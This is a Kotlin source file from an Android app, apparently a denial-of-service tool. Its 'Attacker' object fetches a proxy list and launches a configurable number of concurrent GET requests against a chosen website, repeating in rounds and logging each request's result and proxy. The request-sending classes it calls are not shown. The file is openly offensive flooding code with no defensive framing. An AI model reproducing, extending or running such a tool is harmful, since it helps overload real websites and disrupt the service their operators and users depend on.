package com.bodiart.attack

import android.util.Log
import com.bodiart.attack.model.entity.data.AttackConfig
import com.bodiart.attack.model.entity.data.RequestMethod
import com.bodiart.attack.model.entity.data.RequestResponse
import com.bodiart.attack.model.entity.data.proxy.ProxyInfo
import com.bodiart.attack.model.entity.data.website.Website
import com.bodiart.attack.model.usecase.AttackUseCase
import com.bodiart.attack.model.usecase.ProxiesGetUseCase
import io.github.bodiart.utils.util.extensions.process
import kotlinx.coroutines.*

object Attacker {
    private val tag = Attacker::class.java.simpleName

    private var attackJob: Job? = null
    private var isEnabled = false

    private var proxies = listOf<ProxyInfo>()

    var attackEnableStatusCallback: ((Boolean) -> Unit)? = null

    var proxiesGetSuccessCallback: ((proxyCount: Int) -> Unit)? = null
    var proxiesGetFailedCallback: ((Throwable) -> Unit)? = null
    var proxiesEmptyCallback: (() -> Unit)? = null

    var handleRequestResponseCallback: ((RequestResponse) -> Unit)? = null
    var handleRequestErrorCallback: ((url: String, Throwable) -> Unit)? = null

    var allThreadExecutedCallback: ((url: String) -> Unit)? = null
    var noValidProxiesCallback: (() -> Unit)? = null

    fun startAttack(
        coroutineScope: CoroutineScope,
        website: Website,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long
    ): Job {
        setEnabled(true)
        return coroutineScope.launch {
            // setup website and proxies
            if (!setupProxies()) {
                stopAttack()
                return@launch
            }
            // start attack for website
            proxies?.let { proxies ->
                performAttackForWebsite(
                    website,
                    proxies,
                    asyncRequestCount,
                    delayBetweenAllThreadsExecutedMillis,
                    this
                )
            }

        }.apply { attackJob = this }
    }

    fun stopAttack() {
        setEnabled(false)
    }

    /**
     * Returns is success
     */
    private suspend fun setupProxies(): Boolean = withContext(Dispatchers.IO) {
        if (!handleProxies(ProxiesGetUseCase().perform())) {
            return@withContext false
        }

        // check is websites empty
        if (proxies == null) {
            proxiesEmptyCallback?.invoke()
            return@withContext false
        }

        true
    }

    private fun handleProxies(proxiesResult: Result<List<ProxyInfo>>): Boolean {
        proxiesResult.process(
            {
                proxies = it
                proxiesGetSuccessCallback?.invoke(proxies.size)
            },
            {
                proxiesGetFailedCallback?.invoke(it)
            }
        )
        return proxiesResult.isSuccess
    }

    private fun performAttackForWebsite(
        website: Website,
        proxies: List<ProxyInfo>,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long,
        coroutineScope: CoroutineScope
    ): Job {
        return AttackUseCase(
            coroutineScope,
            AttackConfig(
                website.url,
                RequestMethod.GET,
                mapOf(),
                null,
                null,
                delayBetweenAllThreadsExecutedMillis,
                proxies
            ),
            asyncRequestCount,
            handleRequestResponseCallback = {
                handleRequestResponseCallback?.invoke(it)
                Log.d(tag, "request succeed code=${it.code} url=${website.url} proxy=${it.proxy?.url}:${it.proxy?.port}")
            },
            handleRequestErrorCallback = { throwable, proxy ->
                handleRequestErrorCallback?.invoke(website.url ,throwable)
                Log.d(tag, "request failed code=${throwable.message} url=${website.url} proxy=${proxy?.url}:${proxy?.port}")
            },
            allThreadsExecutedCallback = {
                allThreadExecutedCallback?.invoke(it)
                Log.d(tag, "all threads executed $it")
            },
            noValidProxiesCallback = {
                noValidProxiesCallback?.invoke()
                stopAttack()
                Log.d(tag, "no valid proxies")
            }
        ).perform()
    }

    private fun setEnabled(enabled: Boolean) {
        isEnabled = enabled
        attackEnableStatusCallback?.invoke(isEnabled)
        if (!isEnabled) {
            attackJob?.cancel()
            attackJob = null
        }
    }

}